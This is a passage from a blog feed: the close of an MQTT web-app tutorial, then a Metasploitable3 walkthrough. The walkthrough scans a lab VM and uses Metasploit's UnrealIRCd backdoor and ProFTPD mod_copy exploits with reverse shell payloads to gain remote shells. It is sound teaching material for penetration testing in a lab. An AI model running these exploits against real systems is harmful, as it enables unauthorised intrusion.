/static/5bca9552f2d781ba3d74ca1abe7666af/1568e/messages-style.png 892w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In this tutorial, we have built a custom web application capable of MQTT subscription. Basically, this web application can be configured to connect to an MQTT broker, for example, The Things Network, and can receive data from LoRaWAN nodes. The final result of this project can be seen below:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/d2a752d9f8764bba14d5e766a602af96/705cc/styled-web-application.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 77.84810126582278%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABuklEQVQ4y51TXU/CMBTlX5uIEeK7Row/AhNCwiMSQnyRgHwE2IOOhAQRcAP2veFg27HtKOB0gt7kpOt6e3rO7W3i/qGJ0czAy1DCq2ygWHnCSfISZ+kbJNMZJFMZ8p1h8yjo2mnqGucXtzg5u0JXEJGQ32XoqgpD1+DYFsZvE9TqbVSrDdRqLTI20Wr10Os9o0uwG1/Qbgt4JHmNRoeMTYwnEhLYhEJIO50O+n0Rs/kM/wln+UEJAzbRdR2iKGI4HGIwGGBJFoMggOd5BH4MPPi+z/JWaw+mZe8U2rYNSZKgKiohW2K1Wh0FSkqDHmDazo7Qsiymkp5Ik9br9VGIJdQ0jSiUWcK+gkOEVMA3QloDirjgSqL4WeGGaDQaIZfLIZ/Po1KpoFAoIJu9gyAIbJ0XPwoenr9VGP6cTqcolUool8uo1+uMtFgskjbqs41xll3XpR73CTcnbKT/xTKFaZrhRfoBaZs9Qt4C3ApN4jZ/bWbHQcAJ7Qghv7GfahVXvy+E1vaWQ8JDauIUhpb9qGWXFdg7sqE56AtjogiYZc0gL8S0oWgG5LmC2UI9GvJCwVzRwv26CYO85U8/bsIxdfMNjQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;The completed web application&quot;
        title=&quot;The completed web application&quot;
        src=&quot;/static/d2a752d9f8764bba14d5e766a602af96/f058b/styled-web-application.png&quot;
        srcset=&quot;/static/d2a752d9f8764bba14d5e766a602af96/c26ae/styled-web-application.png 158w,
/static/d2a752d9f8764bba14d5e766a602af96/6bdcf/styled-web-application.png 315w,
/static/d2a752d9f8764bba14d5e766a602af96/f058b/styled-web-application.png 630w,
/static/d2a752d9f8764bba14d5e766a602af96/40601/styled-web-application.png 945w,
/static/d2a752d9f8764bba14d5e766a602af96/705cc/styled-web-application.png 1071w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;This tutorial barely scratched the surface of building a &lt;em&gt;robust&lt;/em&gt; web application for an Internet of Things application. However, we covered the fundamentals. From this knowledge, you could implement the same MQTT connection and subscription, but then use the MQTT message data to build a graph or map! As always, feel free to comment if you have any questions or feedback. If you are interested in a further tutorial that covers secure MQTT please leave a comment. Thanks! &lt;/p&gt;</content:encoded></item><item><title><![CDATA[Metasploitable3 - Pentesting the Ubuntu Linux Version (Part 2)]]></title><description><![CDATA[This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series: Part 1: Building…]]></description><link>https://thomaslaurenson.com/blog/2018-07-09/metasploitable3-pentesting-the-ubuntu-linux-version-part2/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-09/metasploitable3-pentesting-the-ubuntu-linux-version-part2/</guid><pubDate>Mon, 09 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href=&quot;/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/&quot;&gt;Building the Ubuntu Linux Version&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href=&quot;/blog/2018-07-04-metasploitable3-customizing-the-ubuntu-linux-version&quot;&gt;Customizing the Ubuntu Linux Version&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href=&quot;/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1&quot;&gt;Pentesting the Ubuntu Linux Version - SQL Injection&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href=&quot;/blog/2018-07-09/metasploitable3-pentesting-the-ubuntu-linux-version-part2&quot;&gt;Pentesting the Ubuntu Linux Version - Attacking Services&lt;/a&gt; (You are here!)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configuring-the-metasploit-framework&quot;&gt;Configuring the Metasploit Framework&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#port-6697-unrealircd&quot;&gt;Port 6697: UnrealIRCd&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#port-21-proftpd-version-135&quot;&gt;Port 21: ProFTPD version 1.3.5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#port-80-drupal&quot;&gt;Port 80: Drupal&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#resources&quot;&gt;Resources&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;My previous three posts of Metasploitable3 covered &lt;a href=&quot;/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/&quot;&gt;Building Metasploitable3&lt;/a&gt;, &lt;a href=&quot;/blog/2018-07-04/metasploitable3-customizing-the-ubuntu-linux-version&quot;&gt;Customizing Metasploitable3&lt;/a&gt; and &lt;a href=&quot;/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1&quot;&gt;Pentesting Metasploitable3 using SQL Injection&lt;/a&gt;. This post continues with the series that is specifically targeted to the Ubuntu Linux version of Metasploitable3. In this post, we continue with the pentest of Metasploitable3 this time attacking vulnerable services using the Metasploit Framework. &lt;/p&gt;
&lt;p&gt;If you have not followed my Metasploitable3 Ubuntu Linux version series - here is a summary of the network configuration. In my tutorial Metasploitable3 has a &lt;em&gt;Host-Only&lt;/em&gt; network configuration with the IP address of: &lt;code class=&quot;language-text&quot;&gt;192.168.19.20&lt;/code&gt;. While, Kali Linux (version 2018.2) is used as the attack system, again, with &lt;em&gt;Host-Only&lt;/em&gt; network configuration with the IP address of: &lt;code class=&quot;language-text&quot;&gt;192.168.19.10&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;configuring-the-metasploit-framework&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configuring-the-metasploit-framework&quot; aria-label=&quot;configuring the metasploit framework permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configuring the Metasploit Framework&lt;/h2&gt;
&lt;p&gt;If you have not followed my Metasploitable3 Ubuntu Linux version series - start by performing a port scan of the Metasploitable3 system.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;root@kali:~# nmap -sV -Pn -T4 -p 1-65535 -oX metasploitable3.xml 192.168.19.20&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is a basic go-to &lt;code class=&quot;language-text&quot;&gt;nmap&lt;/code&gt; port scan which queries all available ports (&lt;code class=&quot;language-text&quot;&gt;-p 1-65535&lt;/code&gt;), includes service version detection (&lt;code class=&quot;language-text&quot;&gt;-sV&lt;/code&gt;) and saves the results to an XML file type with the name &lt;code class=&quot;language-text&quot;&gt;metasploitable3.xml&lt;/code&gt;. The purpose of saving the &lt;code class=&quot;language-text&quot;&gt;nmap&lt;/code&gt; port scan is to import these results into the Metasploit Framework. To achieve this, we need to create a database. Initialize the Metasploit Framework database using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;root@kali:~# msfdb init
[+] Starting database
[+] Creating database user &apos;msf&apos;
[+] Creating databases &apos;msf&apos;
[+] Creating databases &apos;msf_test&apos;
[+] Creating configuration file &apos;/usr/share/metasploit-framework/config/database.yml&apos;
[+] Creating initial database schema&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you receive an error, you might need to start the PostgreSQL database using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo systemctl start postgresql&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now we can start the Metasploit Framework Console, otherwise known as &lt;em&gt;msfconsole&lt;/em&gt; and started with the command &lt;code class=&quot;language-text&quot;&gt;msfconsole&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;root@kali:~# msfconsole 

       =[ metasploit v4.16.48-dev                         ]
+ -- --=[ 1749 exploits - 1002 auxiliary - 302 post       ]
+ -- --=[ 536 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf &gt; &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Best practice dictates that we load in the &lt;code class=&quot;language-text&quot;&gt;nmap&lt;/code&gt; port scan using the &lt;code class=&quot;language-text&quot;&gt;db_import&lt;/code&gt; command and passing the file name of the &lt;code class=&quot;language-text&quot;&gt;nmap&lt;/code&gt; port scan. This tutorial expects that you started the Metasploit Framework in the same directory as the port scan file. If not, you can use an absolute path to indicate the location of the port scan file. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;msf &gt; db_import metasploitable3.xml
[*] Importing &apos;Nmap XML&apos; data
[*] Import: Parsing with &apos;Nokogiri v1.8.2&apos;
[*] Importing host 192.168.19.20
[*] Successfully imported /root/metasploitable3.xml&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Try the &lt;code class=&quot;language-text&quot;&gt;hosts&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;services&lt;/code&gt; commands to check if the database is loaded and functioning correctly:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;msf &gt; hosts

Hosts
=====

address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----  -------  ---------  -----  -------  ----  --------
192.168.19.20  00:0c:29:00:43:58        Unknown                    device&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;msf &gt; services
Services
========

host           port  proto  name         state   info
----           ----  -----  ----         -----   ----
192.168.19.20  21    tcp    ftp          open    ProFTPD 1.3.5
192.168.19.20  22    tcp    ssh          open    OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 Ubuntu Linux; protocol 2.0
192.168.19.20  80    tcp    http         open    Apache httpd 2.4.7
192.168.19.20  445   tcp    netbios-ssn  open    Samba smbd 3.X - 4.X workgroup: WORKGROUP
192.168.19.20  631   tcp    ipp          open    CUPS 1.7
192.168.19.20  3000  tcp    ppp          closed  
192.168.19.20  3306  tcp    mysql        open    MySQL unauthorized
192.168.19.20  3500  tcp    http         open    WEBrick httpd 1.3.1 Ruby 2.3.7 (2018-03-28)
192.168.19.20  6697  tcp    irc          open    UnrealIRCd
192.168.19.20  8181  tcp    http         open    WEBrick httpd 1.3.1 Ruby 2.3.7 (2018-03-28)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With these configurations set, we are ready to start exploiting vulnerabilities. Well, first finding the vulnerabilities… then exploiting them! The following sections discuss a pentest which is formatted into sections based on the port number of the service running on Metasploitable3.&lt;/p&gt;
&lt;h2 id=&quot;port-6697-unrealircd&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#port-6697-unrealircd&quot; aria-label=&quot;port 6697 unrealircd permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Port 6697: UnrealIRCd&lt;/h2&gt;
&lt;p&gt;I have previously encountered UnrealIRCd in Metasploitable2. Searching the Metasploit Framework database (using &lt;code class=&quot;language-text&quot;&gt;search unrealircd&lt;/code&gt;) only yielded one search hit. This was the same vulnerability and associated exploit used in Metasploitable2. The same of the exploit is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;exploit/unix/irc/unreal&lt;em&gt;ircd&lt;/em&gt;3281_backdoor&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I could not determine the specific version on Metasploitable3, but decided to give the exploit a whirl:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor

msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set rhost 192.168.19.20
rhost =&gt; 192.168.19.20

msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set rport 6697
rport =&gt; 6697

msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set payload cmd/unix/reverse_ruby
payload =&gt; cmd/unix/reverse_ruby

msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set lhost 192.168.19.10
lhost =&gt; 192.168.19.10

msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set lport 2345
lport =&gt; 2345

msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I am not a pentester by trade, or is it something that I do very often… but I thought this was a little simple! I am guessing that the single available exploit for UnrealIRCd made this a little too easy. Anyway, after running the exploit, remote access was gained:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run

[*] Started reverse TCP handler on 192.168.19.10:2345 
[*] 192.168.19.20:6697 - Connected to 192.168.19.20:6697...
    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.19.20:6697 - Sending backdoor command...
[*] Command shell session 1 opened (192.168.19.10:2345 -&gt; 192.168.19.20:49971) at 2018-07-07 22:47:02 -0400&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Running the &lt;code class=&quot;language-text&quot;&gt;whoami&lt;/code&gt; command indicated that I had gained remote access using the &lt;code class=&quot;language-text&quot;&gt;boba_fett&lt;/code&gt; account. I felt like a bounty hunter! I thought it was interesting that I couldn’t traverse the file system using this exploit, rather I was stuck in the &lt;code class=&quot;language-text&quot;&gt;/opt/unrealircd/Unreal3.2&lt;/code&gt; directory, but could navigate the file system by listing directories seeing what was around. I though it strange that after listing the &lt;code class=&quot;language-text&quot;&gt;/home&lt;/code&gt; folder, and the user who was in the group names &lt;em&gt;users&lt;/em&gt; had read and execute permission on all home directories.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ls -la /home/
total 72
drwxr-xr-x 18 root             root    4096 Jul  2 21:26 .
drwxr-xr-x 24 root             root    4096 Jul  2 22:26 ..
drwxr-xr-x  3 anakin_skywalker users   4096 Jul  2 21:47 anakin_skywalker
drwxr-xr-x  3 artoo_detoo      users   4096 Jul  2 21:47 artoo_detoo
drwxr-xr-x  2 ben_kenobi       users   4096 Jul  2 21:26 ben_kenobi
drwxr-xr-x  2 boba_fett        users   4096 Jul  2 21:26 boba_fett
drwxr-xr-x  2 c_three_pio      users   4096 Jul  2 21:26 c_three_pio
drwxr-xr-x  2 chewbacca        users   4096 Jul  2 21:26 chewbacca
drwxr-xr-x  2 darth_vader      users   4096 Jul  2 21:26 darth_vader
drwxr-xr-x  2 greedo           users   4096 Jul  2 21:26 greedo
drwxr-xr-x  2 han_solo         users   4096 Jul  2 21:26 han_solo
drwxr-xr-x  2 jabba_hutt       users   4096 Jul  2 21:26 jabba_hutt
drwxr-xr-x  2 jarjar_binks     users   4096 Jul  2 21:26 jarjar_binks
drwxr-xr-x  4 kylo_ren         users   4096 Jul  2 21:47 kylo_ren
drwxr-xr-x  2 lando_calrissian users   4096 Jul  2 21:26 lando_calrissian
drwxr-xr-x  3 leia_organa      users   4096 Jul  7 22:24 leia_organa
drwxr-xr-x  2 luke_skywalker   users   4096 Jul  2 21:26 luke_skywalker
drwxr-xr-x  5 vagrant          vagrant 4096 Jul  3 00:02 vagrant&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Unfortunately, &lt;code class=&quot;language-text&quot;&gt;sudo&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt; access was not possible as this exploit gained access using the &lt;code class=&quot;language-text&quot;&gt;boba_fett&lt;/code&gt; account, who was not in the &lt;code class=&quot;language-text&quot;&gt;sudo&lt;/code&gt; group (as indicated by the &lt;code class=&quot;language-text&quot;&gt;groups&lt;/code&gt; command). However, &lt;code class=&quot;language-text&quot;&gt;boba_fett&lt;/code&gt; was part of the &lt;code class=&quot;language-text&quot;&gt;docker&lt;/code&gt; group… interesting! Moving on!&lt;/p&gt;
&lt;h2 id=&quot;port-21-proftpd-version-135&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#port-21-proftpd-version-135&quot; aria-label=&quot;port 21 proftpd version 135 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Port 21: ProFTPD version 1.3.5&lt;/h2&gt;
&lt;p&gt;Looking back over the output from the &lt;code class=&quot;language-text&quot;&gt;services&lt;/code&gt; command in the &lt;code class=&quot;language-text&quot;&gt;msfconsole&lt;/code&gt;, the next prospect I choose was the FTP server running port 21.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;192.168.19.20  21    tcp    ftp          open    ProFTPD 1.3.5&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A quick &lt;code class=&quot;language-text&quot;&gt;msfconsole&lt;/code&gt; search yeilded the following results:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
exploit/linux/ftp/proftp_sreplace            2006-11-26       great      ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    NetSupport Manager Agent Remote Buffer Overflow
exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  ProFTPD-1.3.3c Backdoor Command Execution
exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  ProFTPD 1.3.5 Mod_Copy Command Execution&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I mucked around with a few of the exploits listed but did not get very far. All the exploits were at, or below, the version of ProFTPD on Metasploitable3 (version 1.3.5). I tried the last on the list, &lt;code class=&quot;language-text&quot;&gt;proftpd_modcopy_exec&lt;/code&gt;. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;msf &gt; use exploit/unix/ftp/proftpd_modcopy_exec

msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; set rhost 192.168.19.20
rhost =&gt; 192.168.19.20

msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; set sitepath /var/www/html
sitepath =&gt; /var/www/html

msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; set exploit cmd/unix/reverse_perl
exploit =&gt; cmd/unix/reverse_perl

msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; run

[*] Started reverse TCP handler on 192.168.19.10:4444 
[*] 192.168.19.20:80 - 192.168.19.20:21 - Connected to FTP server
[*] 192.168.19.20:80 - 192.168.19.20:21 - Sending copy commands to FTP server
[*] 192.168.19.20:80 - Executing PHP payload /jjIRB1.php
[*] Command shell session 4 opened (192.168.19.10:4444 -&gt; 192.168.19.20:47618) at 2018-07-07 23:21:25 -0400&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This exploit gained remote access as the &lt;code class=&quot;language-text&quot;&gt;www-data&lt;/code&gt; user. This was not very useful, as the UnrealIRCd exploit gained a higher level of access. Moving on!&lt;/p&gt;
